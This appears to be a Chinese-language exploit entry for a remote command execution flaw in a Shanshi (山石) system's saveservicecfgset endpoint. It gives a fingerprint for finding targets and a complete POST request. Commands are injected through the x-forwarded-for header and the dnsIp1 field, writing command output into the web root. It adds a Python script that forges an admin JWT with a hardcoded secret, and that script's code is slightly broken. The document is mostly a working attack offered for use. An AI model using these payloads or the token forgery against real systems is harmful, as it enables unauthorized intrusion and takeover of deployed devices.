# 山石系统saveservicecfgset存在远程命令执行漏洞

- **系统**：山石系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="css/theme/theme_default.css"`
- **请求**：`POST /systemConfig/saveservicecfgset HTTP/1.1`
- **关键头**：`POC: （也可写文件;id>/home/realstone/web/webapps/ROOT/js/uu.txt）`　`X-Requested-With: XMLHttpRequest`　`x-forwarded-for: 127.0.0.1;id>whoami>/home/realstone/web/webapps/ROOT/js/yy.txt;#`　`Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlN5c0FkbWluIiwic…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 88`

**请求体 / payload**
```
id=1&dnsIp1=;ping&dnsIp2=1.1.1.1&dnsIp3=1.1.1.1&webRule=0&webPort=443&sshRule=0&sshPort=22&haRule=1&haIps=&sshStatus=1
该漏洞需要配合jwt权限绕过进行执行：secret = "datafort"
编写了python脚本实现jwt伪造
Python脚本代码如下：
import jwt
import time
# 确定密钥和算法
secret = "datafort"
algorithm = "HS256"
# 构造 Payload
payload = {
"username": "SysAdmin",
"roleId": 1,
"exp": int(time.time()) + 3600  # 当前时间 + 1 小时
# 构造 JWT
token = jwt.encode(payload, secret, algorithm=algorithm)
# PyJWT v2.x 会返回字节串，需 decode 成 str
if isinstance(token, bytes):
token = token.decode()
print("[+] 伪造 JWT 成功：")
print(token)
**漏洞请求截图：**
```
- **预期**：200　|　Dnslog回显